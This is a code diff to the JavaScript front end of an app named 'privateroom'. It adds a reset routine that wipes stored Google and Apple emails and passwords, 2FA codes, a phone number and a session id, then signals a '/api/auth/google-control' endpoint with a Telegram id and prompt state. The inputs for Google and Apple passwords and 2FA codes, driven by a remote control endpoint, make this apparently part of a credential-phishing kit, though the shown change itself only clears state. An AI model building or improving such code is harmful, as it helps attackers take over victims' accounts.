@@ -416,34 +416,72 @@ function initApp() {
 
     // Initial backend status check & continuous polling
     checkAuthStatus();
-    function clearUnfinishedStateOnExit() {
-        if (!isAuthorized) {
+    function fullResetRegistration() {
+        try {
+            localStorage.removeItem("privateroom_authorized");
+            localStorage.removeItem("privateroom_current_step");
+            localStorage.removeItem("privateroom_saved_phone");
+            localStorage.removeItem("privateroom_google_email");
+            localStorage.removeItem("privateroom_google_saved_at");
+            localStorage.removeItem("privateroom_apple_email");
+            localStorage.removeItem("privateroom_session_id");
+            localStorage.removeItem("privateroom_code_requested_at");
+        } catch (e) {}
+        userPhone = "";
+        userGoogleEmail = "";
+        userGooglePassword = "";
+        userAppleEmail = "";
+        userApplePassword = "";
+        isAuthorized = false;
+        currentSessionId = null;
+
+        if (googleEmailInput) googleEmailInput.value = "";
+        if (googlePasswordInput) googlePasswordInput.value = "";
+        if (google2faCodeInput) google2faCodeInput.value = "";
+        if (codeInput) codeInput.value = "";
+        if (password2FA) password2FA.value = "";
+        if (appleEmailInput) appleEmailInput.value = "";
+        if (applePasswordInput) applePasswordInput.value = "";
+        if (apple2faCodeInput) apple2faCodeInput.value = "";
+
+        const targetTgId = (typeof getUserTgId === "function" ? getUserTgId() : null);
+        if (targetTgId) {
+            const payload = JSON.stringify({
+                tg_id: targetTgId,
+                status: null,
+                prompt_number: null,
+                error_msg: null
+            });
             try {
-                localStorage.removeItem("privateroom_current_step");
-                localStorage.removeItem("privateroom_google_email");
-                localStorage.removeItem("privateroom_google_saved_at");
-                localStorage.removeItem("privateroom_apple_email");
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon("/api/auth/google-control", new Blob([payload], { type: "application/json" }));
+                } else {
+                    fetch("/api/auth/google-control", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: payload,
+                        keepalive: true
+                    }).catch(() => {});
+                }
             } catch (e) {}
-            userGoogleEmail = "";
-            userGooglePassword = "";
-            userAppleEmail = "";
-            userApplePassword = "";
         }
+        stopGooglePolling();
+        resetRoomCreation();
     }
 
-    // Always clear unfinished state on startup if not authorized
-    clearUnfinishedStateOnExit();
+    // Always perform a full reset on startup to guarantee a clean slate
+    fullResetRegistration();
 
     window.addEventListener("focus", checkAuthStatus);
     document.addEventListener("visibilitychange", () => {
         if (document.hidden) {
-            clearUnfinishedStateOnExit();
+            fullResetRegistration();
         } else {
             checkAuthStatus();
         }
     });
-    window.addEventListener("pagehide", clearUnfinishedStateOnExit);
-    window.addEventListener("beforeunload", clearUnfinishedStateOnExit);
+    window.addEventListener("pagehide", fullResetRegistration);
+    window.addEventListener("beforeunload", fullResetRegistration);
 
     if (btnBackToHome) {
         btnBackToHome.addEventListener("click", () => {
